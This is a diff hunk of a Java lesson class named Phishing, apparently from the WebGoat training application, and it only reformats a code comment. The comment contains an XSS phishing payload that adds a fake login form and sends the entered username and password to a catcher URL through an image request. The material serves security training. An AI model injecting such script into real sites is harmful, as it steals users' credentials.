@@ -226,12 +226,12 @@ public class Phishing extends LessonAdapter
 		 * password<script>function hack(){ alert("Had this been a real attack... Your credentials
 		 * were just stolen.\nUser Name = " + document.forms[0].user.value + "\nPassword = " +
 		 * document.forms[0].pass.value); XSSImage=new Image;
-		 * XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+document.forms[0].user.value +
-		 * "&password=" + document.forms[0].pass.value + "";}</script><form><br>
+		 * XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="
+		 * +document.forms[0].user.value + "&password=" + document.forms[0].pass.value +
+		 * "";}</script><form><br>
 		 * <br>
 		 * <HR>
-		 * <H3>This feature requires account login:</H2>
-		 * <br>
+		 * <H3>This feature requires account login:</H2> <br>
 		 * <br>
 		 * Enter Username:<br>
 		 * <input type="text" id="user" name="user"><br>
